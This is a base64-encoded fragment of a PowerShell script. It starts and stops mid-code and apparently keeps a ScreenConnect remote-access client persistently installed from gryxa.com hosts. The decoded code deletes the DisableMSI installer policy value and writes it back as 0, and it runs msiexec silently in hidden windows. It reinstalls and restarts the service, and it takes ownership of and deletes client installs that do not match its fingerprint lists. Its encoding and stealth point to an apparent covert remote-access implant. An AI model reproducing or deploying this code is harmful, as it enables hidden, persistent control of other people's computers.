IDI+JjEgfCBPdXQtTnVsbAogICAgJiByZWcuZXhlIGFkZCAnSEtMTVxTT0ZUV0FSRVxQb2xpY2ll
c1xNaWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL3QgUkVHX0RXT1JE
IC9kIDAgL2YgMj4mMSB8IE91dC1OdWxsCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICJt
c2lfcmVwYWlyXyRGaW5nZXJwcmludC5sb2ciCiAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhl
Yy5leGUgLUFyZ3VtZW50TGlzdCAiL2ZhICRndWlkIC9xbiAvbm9yZXN0YXJ0IC9MKnYgYCIkbG9n
YCIiIC1XYWl0IC1QYXNzVGhydQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgOAogICAgJiBzYy5l
eGUgY29uZmlnICIkbmFtZSIgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsCiAgICAmIHNjLmV4
ZSBzdGFydCAiJG5hbWUiIDI+JjEgfCBPdXQtTnVsbAogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMg
NAogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlCiAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpIHsg
cmV0dXJuICJzdmMtcmVzdG9yZWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIgfQogICAgaWYgKCRzdmMp
IHsgcmV0dXJuICJzdmMtc3RpbGwtc3RvcHBlZCBleGl0PSQoJHAuRXhpdENvZGUpIiB9CiAgICBy
ZXR1cm4gInN2Yy1zdGlsbC1taXNzaW5nIGV4aXQ9JCgkcC5FeGl0Q29kZSkiCn0KCiMg4pSA4pSA
IEdyeXhhIE1VU1QtUlVOIGhlYWx0aCAoTDE2KSDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIDilIDilIAKIyBMMTY6IE5FVkVSIHJlaW5zdGFsbCB3aGVuIHNlcnZpY2UgaXMgUnVu
bmluZyAocGFuZWwgZHVwbGljYXRlcykuCiMgICAgICBUQ1AvcmVsYXkgYXJlIGFkdmlzb3J5IG9u
bHkuIFJlaW5zdGFsbCBvbmx5OiBtaXNzaW5nL3N0b3BwZWQgT1IgRlAgZHJpZnQgT1IgLUZvcmNl
LgojIEwxNTogZ3J5eGEtaGVhbHRoIC8gZ3J5eGEtZW5zdXJlIOKAlCA4aCBkZWVwIGNoZWNrIChU
Q1AvcmVsYXkvRlAgZHJpZnQgcmVpbnN0YWxsKS4KJHNjcmlwdDpHcnl4YURlZmF1bHRGcCA9ICc5
OTA4MTk4ZTY2OGU0NzUwJwokc2NyaXB0OkdyeXhhTXNpVXJsID0gJ2h0dHBzOi8vdWkuZ3J5eGEu
Y29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Jwok
c2NyaXB0OkdyeXhhUmVsYXlIb3N0ID0gJ3VwZGF0ZS5ncnl4YS5jb20nCiRzY3JpcHQ6R3J5eGFV
aUhvc3QgPSAndWkuZ3J5eGEuY29tJwokc2NyaXB0OlNldnJ6S2VlcCA9IEAoJzVmNjAxMDU3OTg1
MmU1MDcnLCAnZjg2MWM4MTQwZDQ1MzQyNycpCgpmdW5jdGlvbiBHZXQtR3J5eGFDZmdQYXRoIHsg
Sm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0KCmZ1bmN0aW9uIEdldC1Hcnl4YUZwIHsK
ICAgICRmcCA9ICRzY3JpcHQ6R3J5eGFEZWZhdWx0RnAKICAgICRwID0gR2V0LUdyeXhhQ2ZnUGF0
aAogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsKICAgICAgICBHZXQtQ29udGVu
dCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNo
LU9iamVjdCB7CiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15DVVJSRU5UX0ZQPShbMC05YS1m
QS1GXXsxNn0pXHMqJCcpIHsgJGZwID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigpIH0KICAgICAgICB9
CiAgICB9CiAgICByZXR1cm4gJGZwCn0KCmZ1bmN0aW9uIFNldC1Hcnl4YUZwKFtzdHJpbmddJEZp
bmdlcnByaW50KSB7CiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuIH0KICAgIGlm
ICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRXb3JrRGlyKSkgewogICAgICAgIE5ldy1J
dGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdvcmtEaXIgLUZvcmNlIHwgT3V0LU51bGwK
ICAgIH0KICAgIEAoCiAgICAgICAgIkNVUlJFTlRfRlA9JCgkRmluZ2VycHJpbnQuVG9Mb3dlcigp
KSIKICAgICAgICAiUkVMQVk9JCgkc2NyaXB0OkdyeXhhUmVsYXlIb3N0KSIKICAgICAgICAiVUk9
JCgkc2NyaXB0OkdyeXhhVWlIb3N0KSIKICAgICAgICAiTVNJVVJMPSQoJHNjcmlwdDpHcnl4YU1z
aVVybCkiCiAgICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRv
U3RyaW5nKCdvJykpIgogICAgKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoR2V0LUdyeXhh
Q2ZnUGF0aCkgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQp9CgpmdW5jdGlvbiBHZXQtS2VlcEZpbmdl
cnByaW50cyB7CiAgICAkc2V0ID0gTmV3LU9iamVjdCAnU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVy
aWMuSGFzaFNldFtzdHJpbmddJyAoW1N0cmluZ0NvbXBhcmVyXTo6T3JkaW5hbElnbm9yZUNhc2Up
CiAgICBbdm9pZF0kc2V0LkFkZCgnNWY2MDEwNTc5ODUyZTUwNycpCiAgICBbdm9pZF0kc2V0LkFk
ZCgnZjg2MWM4MTQwZDQ1MzQyNycpCiAgICBbdm9pZF0kc2V0LkFkZCgoR2V0LUdyeXhhRnApKQog
ICAgIyBPNDE6IGFueSBsaXZlL3N0YXJ0aW5nIG5vbi1zZXZyeiBTQyBpcyBhIGtlZXBlciAobmV2
ZXIgZXh0ZXJtaW5hdGUgYXMgZm9yZWlnbikKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2
aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
bnRpbnVlKSkgewogICAgICAgIGlmICgkc3ZjLlN0YXR1cyAtbm90aW4gQCgnUnVubmluZycsICdT
dGFydFBlbmRpbmcnLCAnQ29udGludWVQZW5kaW5nJykpIHsgY29udGludWUgfQogICAgICAgIGlm
ICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7CiAgICAgICAgICAgICRm
cCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQogICAgICAgICAgICBpZiAoJGZwIC1ub3RpbiAkc2Ny
aXB0OlNldnJ6S2VlcCkgewogICAgICAgICAgICAgICAgW3ZvaWRdJHNldC5BZGQoJGZwKQogICAg
ICAgICAgICAgICAgU2V0LUdyeXhhRnAgJGZwCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9
CiAgICByZXR1cm4gQCgkc2V0KQp9CgpmdW5jdGlvbiBUZXN0LVRjcEhvc3RQb3J0KFtzdHJpbmdd
JEhvc3ROYW1lLCBbaW50XSRQb3J0ID0gNDQzLCBbaW50XSRUaW1lb3V0TXMgPSA4MDAwKSB7CiAg
ICBpZiAoLW5vdCAkSG9zdE5hbWUpIHsgcmV0dXJuICRmYWxzZSB9CiAgICAkY2xpZW50ID0gJG51
bGwKICAgIHRyeSB7CiAgICAgICAgJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2Nr
ZXRzLlRjcENsaWVudAogICAgICAgICRpYXIgPSAkY2xpZW50LkJlZ2luQ29ubmVjdCgkSG9zdE5h
bWUsICRQb3J0LCAkbnVsbCwgJG51bGwpCiAgICAgICAgaWYgKC1ub3QgJGlhci5Bc3luY1dhaXRI
YW5kbGUuV2FpdE9uZSgkVGltZW91dE1zLCAkZmFsc2UpKSB7CiAgICAgICAgICAgIHRyeSB7ICRj
bGllbnQuQ2xvc2UoKSB9IGNhdGNoIHt9CiAgICAgICAgICAgIHJldHVybiAkZmFsc2UKICAgICAg
ICB9CiAgICAgICAgJGNsaWVudC5FbmRDb25uZWN0KCRpYXIpCiAgICAgICAgcmV0dXJuICR0cnVl
CiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gJGZhbHNlCiAgICB9IGZpbmFsbHkgewogICAg
ICAgIGlmICgkY2xpZW50KSB7IHRyeSB7ICRjbGllbnQuQ2xvc2UoKSB9IGNhdGNoIHt9IH0KICAg
IH0KfQoKZnVuY3Rpb24gR2V0LU1zaVByb3BlcnR5KFtzdHJpbmddJE1zaVBhdGgsIFtzdHJpbmdd
JFByb3BlcnR5TmFtZSkgewogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1z
aVBhdGgpKSB7IHJldHVybiAkbnVsbCB9CiAgICB0cnkgewogICAgICAgICRpbnN0YWxsZXIgPSBO
ZXctT2JqZWN0IC1Db21PYmplY3QgV2luZG93c0luc3RhbGxlci5JbnN0YWxsZXIKICAgICAgICAk
ZGIgPSAkaW5zdGFsbGVyLk9wZW5EYXRhYmFzZSgoUmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAk
TXNpUGF0aCkuUGF0aCwgMCkKICAgICAgICAkdmlldyA9ICRkYi5PcGVuVmlldygiU0VMRUNUIGBW
YWx1ZWAgRlJPTSBgUHJvcGVydHlgIFdIRVJFIGBQcm9wZXJ0eWA9JyRQcm9wZXJ0eU5hbWUnIikK
ICAgICAgICAkdmlldy5FeGVjdXRlKCkgfCBPdXQtTnVsbAogICAgICAgICRyZWMgPSAkdmlldy5G
ZXRjaCgpCiAgICAgICAgaWYgKC1ub3QgJHJlYykgeyByZXR1cm4gJG51bGwgfQogICAgICAgIHJl
dHVybiBbc3RyaW5nXSRyZWMuU3RyaW5nRGF0YSgxKQogICAgfSBjYXRjaCB7CiAgICAgICAgcmV0
dXJuICRudWxsCiAgICB9Cn0KCmZ1bmN0aW9uIEdldC1GcEZyb21Qcm9kdWN0TmFtZShbc3RyaW5n
XSRQcm9kdWN0TmFtZSkgewogICAgaWYgKCRQcm9kdWN0TmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZB
LUZdezE2fSlcKScpIHsgcmV0dXJuICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9CiAgICByZXR1cm4g
JG51bGwKfQoKZnVuY3Rpb24gRmluZC1Qcm9kdWN0R3VpZChbc3RyaW5nXSRGaW5nZXJwcmludCkg
ewogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICBm
b3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1u
b3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgY29udGludWUgfQogICAgICAgIGZvcmVhY2ggKCRrZXkg
aW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7
CiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlKS5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoJGRuIC1h
bmQgKCRkbiAtaWVxICRuYW1lKSAtYW5kICgka2V5LlBTQ2hpbGROYW1lIC1saWtlICd7Kn0nKSkg
ewogICAgICAgICAgICAgICAgcmV0dXJuICRrZXkuUFNDaGlsZE5hbWUKICAgICAgICAgICAgfQog
ICAgICAgIH0KICAgIH0KICAgIHJldHVybiAkbnVsbAp9CgpmdW5jdGlvbiBUZXN0LUdyeXhhUmVs
YXlDb25maWd1cmVkKFtzdHJpbmddJEZpbmdlcnByaW50KSB7CiAgICAkbmFtZSA9ICJTY3JlZW5D
b25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIKICAgICRkaXJzID0gQCgKICAgICAgICAoSm9p
bi1QYXRoICR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRG
aW5nZXJwcmludCkiKSwKICAgICAgICAoSm9pbi1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzICJTY3Jl
ZW5Db25uZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIpCiAgICApCiAgICAkcGF0dGVybnMgPSBA
KCd1cGRhdGUuZ3J5eGEuY29tJywgJ3VpLmdyeXhhLmNvbScsICdncnl4YS5jb20nKQogICAgZm9y
ZWFjaCAoJGQgaW4gJGRpcnMpIHsKICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFs
UGF0aCAkZCkpIHsgY29udGludWUgfQogICAgICAgICRmaWxlcyA9IEAoR2V0LUNoaWxkSXRlbSAt
TGl0ZXJhbFBhdGggJGQgLUZpbGUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBTZWxl
Y3QtT2JqZWN0IC1GaXJzdCA2MCkKICAgICAgICBmb3JlYWNoICgkZiBpbiAkZmlsZXMpIHsKICAg
ICAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkcGF0dGVybnMpIHsKICAgICAgICAgICAgICAgIGlm
IChTZWxlY3QtU3RyaW5nIC1MaXRlcmFsUGF0aCAkZi5GdWxsTmFtZSAtUGF0dGVybiAkcGF0IC1T
aW1wbGVNYXRjaCAtUXVpZXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpIHsKICAgICAg
ICAgICAgICAgICAgICByZXR1cm4gJHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAg
fQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCRmLkxlbmd0aCAtZ3QgMk1C
KSB7IGNvbnRpbnVlIH0KICAgICAgICAgICAgICAgICRieXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06
OlJlYWRBbGxCeXRlcygkZi5GdWxsTmFtZSkKICAgICAgICAgICAgICAgICR0ZXh0ID0gW1N5c3Rl
bS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJ5dGVzKQogICAgICAgICAgICAg
ICAgaWYgKCR0ZXh0IC1tYXRjaCAnZ3J5eGFcLmNvbScpIHsgcmV0dXJuICR0cnVlIH0KICAgICAg
ICAgICAgICAgICR0ZXh0OCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5n
KCRieXRlcykKICAgICAgICAgICAgICAgIGlmICgkdGV4dDggLW1hdGNoICdncnl4YVwuY29tJykg
eyByZXR1cm4gJHRydWUgfQogICAgICAgICAgICB9IGNhdGNoIHt9CiAgICAgICAgfQogICAgfQog
ICAgJGltZyA9IChHZXQtSXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xT
ZXRcU2VydmljZXNcJG5hbWUiIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5JbWFnZVBh
dGgKICAgIGlmICgkaW1nIC1hbmQgKCRpbWcgLW1hdGNoICdncnl4YVwuY29tJykpIHsgcmV0dXJu
ICR0cnVlIH0KICAgIGlmIChGaW5kLVByb2R1Y3RHdWlkICRGaW5nZXJwcmludCkgeyByZXR1cm4g
JHRydWUgfQogICAgcmV0dXJuICRmYWxzZQp9CgpmdW5jdGlvbiBUZXN0LVNjUnVubmluZyhbc3Ry
aW5nXSRGaW5nZXJwcmludCkgewogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAk
ZmFsc2UgfQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICJTY3JlZW5Db25uZWN0IENsaWVu
dCAoJEZpbmdlcnByaW50KSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgIHJldHVy
biBbYm9vbF0oJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1lcSAnUnVubmluZycpCn0KCmZ1bmN0aW9u
IFRlc3QtU2NEaXIoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsKICAgIGZvcmVhY2ggKCRiYXNlIGlu
IEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9LCAkZW52OlByb2dyYW1GaWxlcykpIHsKICAgICAg
ICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRiYXNlICJTY3JlZW5Db25u
ZWN0IENsaWVudCAoJEZpbmdlcnByaW50KSIpKSB7IHJldHVybiAkdHJ1ZSB9CiAgICB9CiAgICBy
ZXR1cm4gJGZhbHNlCn0KCmZ1bmN0aW9uIEZpbmQtUnVubmluZ0dyeXhhRnAgewogICAgIyBBTlkg
bm9uLXNldnJ6IFNjcmVlbkNvbm5lY3QgQ2xpZW50IHRoYXQgaXMgUnVubmluZy9zdGFydGluZyBj
b3VudHMgYXMgR3J5eGEuCiAgICAjIERvIE5PVCByZXF1aXJlIHJlbGF5LXN0cmluZyBzY2FuIChm
YWxzZSBuZWdhdGl2ZXMgY2F1c2VkIHJlaW5zdGFsbCBsb29wcykuCiAgICAkY2ZnID0gR2V0LUdy
eXhhRnAKICAgIGlmIChUZXN0LVNjUnVubmluZyAkY2ZnKSB7IHJldHVybiAkY2ZnIH0KICAgIGZv
cmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudCon
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAgIGlmICgkc3ZjLlN0YXR1
cyAtbm90aW4gQCgnUnVubmluZycsICdTdGFydFBlbmRpbmcnLCAnQ29udGludWVQZW5kaW5nJykp
IHsgY29udGludWUgfQogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsx
Nn0pXCknKSB7CiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQogICAgICAg
ICAgICBpZiAoJGZwIC1pbiAkc2NyaXB0OlNldnJ6S2VlcCkgeyBjb250aW51ZSB9CiAgICAgICAg
ICAgIHJldHVybiAkZnAKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJG51bGwKfQoKZnVuY3Rp
b24gVGVzdC1BbnlOb25TZXZyelNjUnVubmluZyB7CiAgICByZXR1cm4gW2Jvb2xdKEZpbmQtUnVu
bmluZ0dyeXhhRnApCn0KCmZ1bmN0aW9uIFRlc3QtR3J5eGFIZWFsdGggewogICAgIyBMT0NBTCBo
ZWFsdGggb25seS4gVENQL3JlbGF5IG5ldmVyIG1hcmsgVU5IRUFMVEhZIChhdm9pZHMgcGFuZWwg
ZHVwbGljYXRlcykuCiAgICAkZnAgPSBHZXQtR3J5eGFGcAogICAgJHJ1bm5pbmdGcCA9IEZpbmQt
UnVubmluZ0dyeXhhRnAKICAgIGlmICgkcnVubmluZ0ZwKSB7CiAgICAgICAgaWYgKCRydW5uaW5n
RnAgLW5lICRmcCkgeyBTZXQtR3J5eGFGcCAkcnVubmluZ0ZwOyAkZnAgPSAkcnVubmluZ0ZwIH0K
ICAgICAgICAkdGNwUmVsYXkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5eGFSZWxheUhv
c3QgNDQzCiAgICAgICAgJHRjcFVpID0gVGVzdC1UY3BIb3N0UG9ydCAkc2NyaXB0OkdyeXhhVWlI
b3N0IDQ0MwogICAgICAgIHJldHVybiAiSEVBTFRIWXwkZnB8cnVubmluZz0xfHJlbGF5PSR0Y3BS
ZWxheXx1aT0kdGNwVWkiCiAgICB9CgogICAgJHJlYXNvbnMgPSBOZXctT2JqZWN0IFN5c3RlbS5D
b2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgaWYgKC1ub3QgKFRlc3QtU2NSdW5u
aW5nICRmcCkpIHsKICAgICAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICgkZnApIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgIGlm
ICgtbm90ICRzdmMpIHsgW3ZvaWRdJHJlYXNvbnMuQWRkKCdzdmMtbWlzc2luZycpIH0KICAgICAg
ICBlbHNlIHsgW3ZvaWRdJHJlYXNvbnMuQWRkKCJzdmMtJCgkc3ZjLlN0YXR1cykiKSB9CiAgICB9
CiAgICBpZiAoLW5vdCAoVGVzdC1TY0RpciAkZnApIC1hbmQgLW5vdCAoRmluZC1Qcm9kdWN0R3Vp
ZCAkZnApKSB7CiAgICAgICAgW3ZvaWRdJHJlYXNvbnMuQWRkKCdub3QtaW5zdGFsbGVkJykKICAg
IH0KCiAgICAkdGNwUmVsYXkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5eGFSZWxheUhv
c3QgNDQzCiAgICAkdGNwVWkgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5eGFVaUhvc3Qg
NDQzCiAgICBpZiAoJHJlYXNvbnMuQ291bnQgLWVxIDApIHsKICAgICAgICAjIHJlZ2lzdGVyZWQv
ZGlyIHByZXNlbnQgYnV0IHNlcnZpY2Ugbm90IHJ1bm5pbmcg4oCUIHN0aWxsIHVuaGVhbHRoeSBm
b3Igc3RhcnQvcmVwYWlyCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtU2NSdW5uaW5nICRmcCkpIHsK
ICAgICAgICAgICAgcmV0dXJuICJVTkhFQUxUSFl8JGZwfHN2Yy1ub3QtcnVubmluZ3xyZWxheT0k
dGNwUmVsYXl8dWk9JHRjcFVpIgogICAgICAgIH0KICAgICAgICByZXR1cm4gIkhFQUxUSFl8JGZw
fHJlbGF5PSR0Y3BSZWxheXx1aT0kdGNwVWkiCiAgICB9CiAgICByZXR1cm4gIlVOSEVBTFRIWXwk
ZnB8JCgkcmVhc29ucyAtam9pbiAnLCcpfHJlbGF5PSR0Y3BSZWxheXx1aT0kdGNwVWkiCn0KCmZ1
bmN0aW9uIFRlc3QtR3J5eGFSZWluc3RhbGxBbGxvd2VkIHsKICAgICMgTWF4IG9uZSByZWluc3Rh
bGwgcGVyIDEyaCB1bmxlc3MgLUZvcmNlIChzdG9wcyBkdXBsaWNhdGUgc3Rvcm0pCiAgICAkZmxh
ZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfcmVpbnN0YWxsLmZsYWcnCiAgICBpZiAoLW5v
dCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZmxhZykpIHsgcmV0dXJuICR0cnVlIH0KICAgIHRy
eSB7CiAgICAgICAgJGFnZSA9IChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRm
bGFnKS5MYXN0V3JpdGVUaW1lCiAgICAgICAgcmV0dXJuICgkYWdlLlRvdGFsSG91cnMgLWdlIDE2
OCkKICAgIH0gY2F0Y2ggeyByZXR1cm4gJHRydWUgfQp9CgpmdW5jdGlvbiBNYXJrLUdyeXhhUmVp
bnN0YWxsIHsKICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGly
ICdncnl4YV9yZWluc3RhbGwuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGlt
ZSgpLlRvU3RyaW5nKCdvJykgLUVuY29kaW5nIEFTQ0lJIC1Gb3JjZQp9CgpmdW5jdGlvbiBVbmlu
c3RhbGwtU2NGaW5nZXJwcmludChbc3RyaW5nXSRGaW5nZXJwcmludCkgewogICAgaWYgKC1ub3Qg
JEZpbmdlcnByaW50KSB7IHJldHVybiAnbm8tZnAnIH0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIgogICAgJGd1aWQgPSBGaW5kLVByb2R1Y3RHdWlkICRG
aW5nZXJwcmludAogICAgJiByZWcuZXhlIGRlbGV0ZSAnSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xN
aWNyb3NvZnRcV2luZG93c1xJbnN0YWxsZXInIC92IERpc2FibGVNU0kgL2YgMj4mMSB8IE91dC1O
dWxsCiAgICAmIHJlZy5leGUgYWRkICdIS0xNXFNPRlRXQVJFXFBvbGljaWVzXE1pY3Jvc29mdFxX
aW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiAyPiYx
IHwgT3V0LU51bGwKICAgIGlmICgkZ3VpZCkgewogICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBt
c2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIveCAkZ3VpZCAvcW4gL25vcmVzdGFydCBSRUJPT1Q9
UmVhbGx5U3VwcHJlc3MiIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAg
ICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNgogICAgfQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1O
YW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICBpZiAoJHN2Yykgewog
ICAgICAgICYgc2MuZXhlIHN0b3AgJG5hbWUgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgJiBzYy5l
eGUgZGVsZXRlICRuYW1lIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNv
bmRzIDIKICAgIH0KICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9LCAkZW52OlByb2dyYW1GaWxlcykpIHsKICAgICAgICAkZCA9IEpvaW4tUGF0aCAkYmFzZSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiCiAgICAgICAgaWYgKFRlc3QtUGF0
aCAtTGl0ZXJhbFBhdGggJGQpIHsKICAgICAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAv
RCBZIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGgg
JGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAg
fQogICAgfQogICAgcmV0dXJuICdyZW1vdmVkJwp9CgpmdW5jdGlvbiBJbnN0YWxsLUdyeXhhRnJv
bU1zaShbc3RyaW5nXSRNc2lQYXRoKSB7CiAgICAmIHJlZy5leGUgZGVsZXRlICdIS0xNXFNPRlRX
QVJFXFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlcicgL3YgRGlzYWJsZU1TSSAv
ZiAyPiYxIHwgT3V0LU51bGwKICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVcUG9saWNp
ZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJFR19EV09S
RCAvZCAwIC9mIDI+JjEgfCBPdXQtTnVsbAogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAn
bXNpX2dyeXhhX2Vuc3VyZS5sb2cnCiAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUg
LUFyZ3VtZW50TGlzdCAiL2kgYCIkTXNpUGF0aGAiIC9xbiAvbm9yZXN0YXJ0IEFMTFVTRVJTPTEg
UkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydSAtV2lu
ZG93U3R5bGUgSGlkZGVuCiAgICAkZXhpdCA9ICRwLkV4aXRDb2RlCiAgICBpZiAoJGV4aXQgLWVx
IDE2MTgpIHsKICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAzMAogICAgICAgICRwID0gU3Rh
cnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIvaSBgIiRNc2lQYXRoYCIgL3Fu
IC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wqdiBgIiRsb2dg
IiIgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAkZXhpdCA9ICRw
LkV4aXRDb2RlCiAgICB9CiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxMAogICAgcmV0dXJuICRl
